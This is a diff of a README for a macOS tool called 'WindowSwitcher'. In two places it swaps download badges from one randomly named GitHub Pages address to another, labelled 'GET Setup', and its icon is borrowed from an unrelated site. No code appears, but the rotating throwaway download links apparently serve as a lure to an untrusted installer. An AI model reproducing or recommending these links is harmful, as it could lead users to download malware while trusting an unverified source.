@@ -2,11 +2,7 @@
 
 ![WindowSwitcher Icon](https://noteifyapp.com/wp-content/uploads/2019/02/icon_256x256@2x.jpg)
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Window">
-    <img src="https://img.shields.io/badge/⬇️_Download_WindowSwitcher-Tool-3498db?style=for-the-badge&logo=apple&logoColor=white" alt="Download WindowSwitcher for macOS">
-  </a>
-</p>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://chandraottenwesscqlim.github.io/.github/Window-Switcher)
 
 ---
 
@@ -77,11 +73,7 @@ Yes — supports multi-monitor setups.
 **Is it resource-light?**  
 Yes — designed to be efficient, with minimal CPU/RAM usage.  
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Window">
-    <img src="https://img.shields.io/badge/⬇️_Download_WindowSwitcher-Tool-3498db?style=for-the-badge&logo=apple&logoColor=white" alt="Download WindowSwitcher for macOS">
-  </a>
-</p>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://chandraottenwesscqlim.github.io/.github/Window-Switcher)
 
 ---
 
